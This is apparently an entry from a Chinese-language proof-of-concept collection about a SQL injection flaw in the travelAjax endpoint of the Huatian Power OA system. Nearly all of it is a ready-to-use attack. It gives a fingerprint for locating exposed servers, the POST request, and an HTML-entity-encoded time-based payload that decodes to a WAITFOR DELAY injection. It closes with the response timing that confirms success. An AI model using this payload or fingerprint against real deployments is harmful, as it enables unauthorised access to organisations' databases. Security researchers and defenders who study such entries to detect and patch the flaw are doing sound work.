# 华天动力OAtravelAjax存在SQL注入漏洞

华天动力 ｜ SQL注入 ｜ —
- **指纹**：`body="/OAapp/WebObjects/OAapp.woa"`
- **请求**：`POST /OAapp/bfapp/buffalo/travelAjax HTTP/1.1`

**Payload**
```
注入语句HTML编码
Host:
Content-Type: text/html
<buffalo-call>
<method>getLoanAmount</method>
<string>&#49;&apos;&#32;&#87;&#65;&#73;&#84;&#70;&#79;&#82;&#32;&#68;&#69;&#76;&#65;&#89;&#32;&apos;&#48;&#58;&#48;&#58;&#53;&apos;&#45;&#45;&#32;</string>
</buffalo-call>
```
- **响应特征**：200 响应时间>=5s